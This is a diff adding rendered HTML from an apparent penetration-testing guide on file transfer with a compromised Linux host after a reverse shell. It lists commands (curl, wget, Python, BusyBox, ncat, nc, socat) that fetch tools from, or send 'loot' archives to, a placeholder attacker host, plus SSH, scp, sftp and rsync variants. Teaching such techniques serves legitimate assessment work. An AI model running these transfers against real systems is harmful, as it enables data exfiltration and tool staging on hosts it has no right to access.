+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> curl</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> wget</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> python3</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> python</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> busybox</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> nc</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> ncat</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> socat</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> ssh</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> scp</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> sftp</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> rsync</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> smbclient</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> base64</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> xxd</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> tar</span></span>
+<span class="line"><span style="color:#79C0FF">command</span><span style="color:#79C0FF"> -v</span><span style="color:#A5D6FF"> sha256sum</span></span></code></pre>
+<p><code>$SHELL</code> describes the user’s configured login shell and does not necessarily identify the shell behind the current reverse shell. <code>ps -p $$ -o comm=</code> is usually more useful when shell-specific syntax matters.</p>
+<p>A writable directory is also contextual. <code>/tmp</code> is common, but do not assume that every target allows the current identity to write there or execute from it.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">test</span><span style="color:#79C0FF"> -w</span><span style="color:#A5D6FF"> /tmp</span><span style="color:#E6EDF3"> &#x26;&#x26; </span><span style="color:#79C0FF">echo</span><span style="color:#A5D6FF"> "/tmp is writable"</span></span>
+<span class="line"><span style="color:#FFA657">df</span><span style="color:#79C0FF"> -h</span><span style="color:#A5D6FF"> /tmp</span><span style="color:#FF7B72"> 2></span><span style="color:#A5D6FF">/dev/null</span></span></code></pre>
+<h2 id="http">HTTP</h2>
+<p>HTTP is often the shortest path when the Linux host can initiate a connection to the operator machine.</p>
+<h3 id="attacker-setup">Attacker setup</h3>
+<p>Python provides a simple read-only file server:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> http.server</span><span style="color:#79C0FF"> 8000</span><span style="color:#79C0FF"> --directory</span><span style="color:#A5D6FF"> /opt/tools</span></span></code></pre>
+<p>Files under <code>/opt/tools</code> are then reachable at:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>http://&#x3C;ATTACKER_IP>:8000/</span></span></code></pre>
+<p>The server is convenient for temporary assessment infrastructure. Expose only the directory you intend to serve.</p>
+<h3 id="download">Download</h3>
+<p>Equivalent target-side options can be grouped by what is installed.</p>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="curl"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#79C0FF"> -fL</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/tool</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre></section><section class="pub-tab" data-tab-label="wget"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">wget</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/tool</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -O</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre></section><section class="pub-tab" data-tab-label="Python 3"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -c</span><span style="color:#A5D6FF"> "import urllib.request; urllib.request.urlretrieve('http://&#x3C;ATTACKER_IP>:8000/tool', '/tmp/tool')"</span></span></code></pre></section><section class="pub-tab" data-tab-label="BusyBox"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">busybox</span><span style="color:#A5D6FF"> wget</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -O</span><span style="color:#A5D6FF"> /tmp/tool</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/tool</span></span></code></pre></section></div>
+<p><code>curl -f</code> makes HTTP 4xx/5xx responses fail instead of silently saving an error page as the intended binary, and <code>-L</code> follows redirects.</p>
+<p>The BusyBox command is only a valid fallback when that build includes the <code>wget</code> applet and supports the options shown. BusyBox is compiled as a selectable set of applets, so inspect the actual target instead of assuming a full GNU-like toolset:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">busybox</span><span style="color:#79C0FF"> --list</span><span style="color:#FF7B72"> 2></span><span style="color:#A5D6FF">/dev/null</span></span>
+<span class="line"><span style="color:#FFA657">busybox</span><span style="color:#A5D6FF"> wget</span><span style="color:#79C0FF"> --help</span><span style="color:#FF7B72"> 2>&#x26;1</span><span style="color:#FF7B72"> |</span><span style="color:#FFA657"> head</span></span></code></pre>
+<p>If the downloaded file is meant to be executed, transfer and execution are separate concerns:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">chmod</span><span style="color:#A5D6FF"> +x</span><span style="color:#A5D6FF"> /tmp/tool</span></span>
+<span class="line"><span style="color:#FFA657">file</span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<h3 id="resuming-an-interrupted-download">Resuming an interrupted download</h3>
+<p>curl can derive the resume offset from the existing output file:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#79C0FF"> -fL</span><span style="color:#79C0FF"> -C</span><span style="color:#A5D6FF"> -</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/large.tar.gz</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -o</span><span style="color:#A5D6FF"> /tmp/large.tar.gz</span></span></code></pre>
+<p>Wget resumes a file left by an earlier invocation with <code>-c</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">cd</span><span style="color:#A5D6FF"> /tmp</span></span>
+<span class="line"><span style="color:#FFA657">wget</span><span style="color:#79C0FF"> -c</span><span style="color:#A5D6FF"> http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/large.tar.gz</span></span></code></pre>
+<p>Both methods depend on the HTTP server supporting range requests for a real HTTP resume. Verify the resulting file rather than assuming that a partial transfer was continued correctly.</p>
+<p>For Wget, avoid treating <code>-O</code> as a simple rename option when resuming. <code>-O</code> behaves like output redirection and truncates the selected output file when the transfer starts; using the URL-derived local filename with <code>-c</code> keeps the continuation semantics unambiguous.</p>
+<h2 id="http-upload">HTTP upload</h2>
+<p>A plain <code>python3 -m http.server</code> serves files but is not a general upload receiver. The target needs an endpoint whose method and body format match the client command.</p>
+<h3 id="attacker-setup-with-uploadserver">Attacker setup with uploadserver</h3>
+<p><code>uploadserver</code> extends Python’s simple server with an upload endpoint:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pip</span><span style="color:#A5D6FF"> install</span><span style="color:#79C0FF"> --user</span><span style="color:#A5D6FF"> uploadserver</span></span>
+<span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> uploadserver</span><span style="color:#79C0FF"> 8000</span><span style="color:#79C0FF"> --directory</span><span style="color:#A5D6FF"> ./loot</span></span></code></pre>
+<p>The multipart upload endpoint is:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>http://&#x3C;ATTACKER_IP>:8000/upload</span></span></code></pre>
+<h3 id="upload-with-curl">Upload with curl</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#79C0FF"> -f</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -X</span><span style="color:#A5D6FF"> POST</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -F</span><span style="color:#A5D6FF"> 'files=@/tmp/loot.tar.gz'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/upload</span></span></code></pre>
+<p>The server renames a duplicate filename by default rather than replacing the existing file. Use <code>--allow-replace</code> on the receiver only when overwriting is intentional.</p>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Match the receiver's upload mechanism</strong><p>A multipart <code>POST</code>, an HTTP <code>PUT</code>, WebDAV, and a custom application endpoint are different upload mechanisms even though they all use HTTP. A syntactically valid curl command can fail with <code>405 Method Not Allowed</code>, <code>400 Bad Request</code>, or an application error because the receiver expects another method or body format.</p></aside>
+<p>curl can also upload a file with HTTP PUT:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#79C0FF"> -f</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -T</span><span style="color:#A5D6FF"> /tmp/loot.tar.gz</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:8000/loot.tar.gz</span></span></code></pre>
+<p>With an HTTP(S) URL, <code>-T</code> / <code>--upload-file</code> uses PUT. This works only when the receiving server explicitly accepts PUT at that path; <code>uploadserver</code>’s <code>/upload</code> example instead expects multipart POST.</p>
+<h2 id="ssh-and-sftp">SSH and SFTP</h2>
+<p>If you already have working SSH authentication, use it before creating another service. SSH gives several transfer options with authentication and encryption already solved.</p>
+<h3 id="scp">scp</h3>
+<p>From the operator machine, upload to the Linux host:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">scp</span><span style="color:#A5D6FF"> ./tool</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/tool</span></span></code></pre>
+<p>Download from the Linux host:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">scp</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/loot.tar.gz</span><span style="color:#A5D6FF"> ./loot.tar.gz</span></span></code></pre>
+<p>For a non-default SSH port:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">scp</span><span style="color:#79C0FF"> -P</span><span style="color:#79C0FF"> 2222</span><span style="color:#A5D6FF"> ./tool</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/tool</span></span></code></pre>
+<p>Modern OpenSSH <code>scp</code> uses SFTP for transfers by default. If SSH login works but <code>scp</code> fails against an older or unusual server that does not provide a usable SFTP subsystem, the legacy SCP protocol can be selected explicitly:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">scp</span><span style="color:#79C0FF"> -O</span><span style="color:#A5D6FF"> ./tool</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/tool</span></span></code></pre>
+<p><code>-O</code> is a compatibility fallback, not a generally better transfer mode.</p>
+<h3 id="sftp">SFTP</h3>
+<p>When the operator connects to the target with SFTP:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sftp</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>the useful commands are:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>put ./tool /tmp/tool</span></span>
+<span class="line"><span>get /tmp/loot.tar.gz ./loot.tar.gz</span></span></code></pre>
+<p>For a non-default port:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sftp</span><span style="color:#79C0FF"> -P</span><span style="color:#79C0FF"> 2222</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span></span></code></pre>
+<p>SFTP also provides explicit resume operations:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>reput ./large.tar.gz /tmp/large.tar.gz</span></span>
+<span class="line"><span>reget /tmp/large.tar.gz ./large.tar.gz</span></span></code></pre>
+<p>Resumption assumes that the existing partial copy is the beginning of the same source file. If either side changed, restart the transfer and verify the result.</p>
+<h3 id="rsync-over-ssh">rsync over SSH</h3>
+<p>When <code>rsync</code> is available on both sides, it is useful for directories and interrupted transfers.</p>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">rsync</span><span style="color:#79C0FF"> -avP</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -e</span><span style="color:#A5D6FF"> 'ssh -p 2222'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  ./tools/</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/tools/</span></span></code></pre>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">rsync</span><span style="color:#79C0FF"> -avP</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -e</span><span style="color:#A5D6FF"> 'ssh -p 2222'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/loot/</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  ./loot/</span></span></code></pre>
+<p><code>-P</code> is shorthand for <code>--partial --progress</code>: interrupted partial files are retained so a later run can reuse them.</p>
+<p>For a single file where preserving archive metadata is unnecessary, a smaller option set is also fine:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">rsync</span><span style="color:#79C0FF"> -P</span><span style="color:#A5D6FF"> ./large.tar.gz</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:/tmp/large.tar.gz</span></span></code></pre>
+<h3 id="streaming-through-ssh">Streaming through SSH</h3>
+<p>An SSH session can move arbitrary bytes without relying on <code>scp</code>, SFTP, or <code>rsync</code>.</p>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF"> 'cat > /tmp/tool'</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> ./tool</span></span></code></pre>
+<p>Download:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF"> 'cat /tmp/loot.tar.gz'</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> ./loot.tar.gz</span></span></code></pre>
+<p>This is useful when the SSH transport works but a file-transfer subsystem does not.</p>
+<p>A directory can be streamed without first creating an archive on disk:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">tar</span><span style="color:#A5D6FF"> czf</span><span style="color:#A5D6FF"> -</span><span style="color:#79C0FF"> -C</span><span style="color:#A5D6FF"> ./tools</span><span style="color:#A5D6FF"> .</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#FF7B72">  |</span><span style="color:#FFA657"> ssh</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF"> 'mkdir -p /tmp/tools &#x26;&#x26; tar xzf - -C /tmp/tools'</span></span></code></pre>
+<p>The reverse direction works the same way:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ssh</span><span style="color:#A5D6FF"> user@</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">TARGE</span><span style="color:#E6EDF3">T</span><span style="color:#FF7B72">></span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#A5D6FF">  'tar czf - -C /var/tmp evidence'</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#FF7B72">  ></span><span style="color:#A5D6FF"> evidence.tar.gz</span></span></code></pre>
+<h2 id="raw-tcp">Raw TCP</h2>
+<p>A raw TCP stream is useful when higher-level clients are missing and the target can reach a listening operator port. It provides no authentication or encryption by itself.</p>
+<h3 id="ncat">Ncat</h3>
+<p>Ncat has explicit one-way modes that make file-transfer EOF behavior predictable.</p>
+<p>Target → attacker:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --recv-only</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> loot.tar.gz</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> --send-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 9001</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> /tmp/loot.tar.gz</span></span></code></pre>
+<p>Attacker → target:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --send-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> tool</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> --recv-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 9001</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p><code>--send-only</code> closes the connection when input reaches EOF, which avoids a common one-way transfer hanging while each side waits for the other.</p>
+<h3 id="nc-on-a-constrained-target">nc on a constrained target</h3>
+<p><code>nc</code> is often present when Ncat is not. The connect-side form is widely portable:</p>
+<p>Upload from target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nc</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 9001</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> /tmp/loot.tar.gz</span></span></code></pre>
+<p>with Ncat receiving on the attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --recv-only</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> loot.tar.gz</span></span></code></pre>
+<p>Some <code>nc</code> implementations keep the socket open after standard input reaches EOF. In that case the bytes may already have been sent while one or both processes continue waiting. OpenBSD netcat provides <code>-N</code> to shut down the network socket after EOF and netcat-traditional commonly provides <code>-q 0</code>, but those switches are implementation-specific. Check <code>nc -h</code> before relying on either.</p>
+<p>Download to target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">nc</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#79C0FF"> 9001</span><span style="color:#FF7B72"> ></span><span style="color:#A5D6FF"> /tmp/tool</span></span></code></pre>
+<p>with Ncat sending on the attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">ncat</span><span style="color:#79C0FF"> -l</span><span style="color:#79C0FF"> 9001</span><span style="color:#79C0FF"> --send-only</span><span style="color:#FF7B72"> &#x3C;</span><span style="color:#A5D6FF"> tool</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">netcat implementations are not interchangeable</strong><p>OpenBSD netcat, traditional netcat, Ncat, and BusyBox <code>nc</code> do not expose exactly the same listener and EOF options. Do not memorize one <code>nc -l ...</code> syntax as universal. Prefer the predictable Ncat listener on the operator side when available and inspect the target implementation with <code>nc -h</code> or <code>busybox nc --help</code>.</p></aside>
+<h3 id="socat">socat</h3>
+<p><code>socat</code> is another binary-safe one-way option.</p>
+<p>Target → attacker:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">socat</span><span style="color:#79C0FF"> -u</span><span style="color:#A5D6FF"> TCP-LISTEN:9001,reuseaddr</span><span style="color:#A5D6FF"> CREATE:loot.tar.gz</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">socat</span><span style="color:#79C0FF"> -u</span><span style="color:#A5D6FF"> FILE:/tmp/loot.tar.gz</span><span style="color:#A5D6FF"> TCP:</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:9001</span></span></code></pre>
+<p>Attacker → target:</p>
+<p>Attacker:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">socat</span><span style="color:#79C0FF"> -u</span><span style="color:#A5D6FF"> FILE:tool</span><span style="color:#A5D6FF"> TCP-LISTEN:9001,reuseaddr</span></span></code></pre>
+<p>Target:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">socat</span><span style="color:#79C0FF"> -u</span><span style="color:#A5D6FF"> TCP:</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">ATTACKER_I</span><span style="color:#E6EDF3">P</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">:9001</span><span style="color:#A5D6FF"> CREATE:/tmp/tool</span></span></code></pre>
+<p>The <code>-u</code> switch makes the connection unidirectional from the first address to the second.</p>
